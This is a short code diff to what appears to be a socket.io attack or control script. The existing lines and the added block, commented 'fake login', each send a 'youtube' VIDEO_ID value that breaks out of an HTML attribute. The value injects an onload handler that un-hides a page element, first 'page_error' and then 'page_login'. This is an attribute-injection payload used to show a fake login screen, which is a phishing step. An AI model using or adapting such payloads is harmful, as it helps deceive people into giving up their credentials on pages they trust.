@@ -26,3 +26,10 @@ socket.emit('command', {
     "VIDEO_ID\" onload='document.getElementById(\"page_error\").style.display=\"block\";document.getElementById(\"page_error\").style.visibility=\"visible\";document.getElementById(\"page_error\").style.opacity=\"1\";'"
   ]
 });
+// fake login
+socket.emit('command', {
+  list: [
+    'youtube',
+    "VIDEO_ID\" onload='document.getElementById(\"page_login\").style.display=\"block\";document.getElementById(\"page_login\").style.visibility=\"visible\";document.getElementById(\"page_login\").style.opacity=\"1\";'"
+  ]
+});
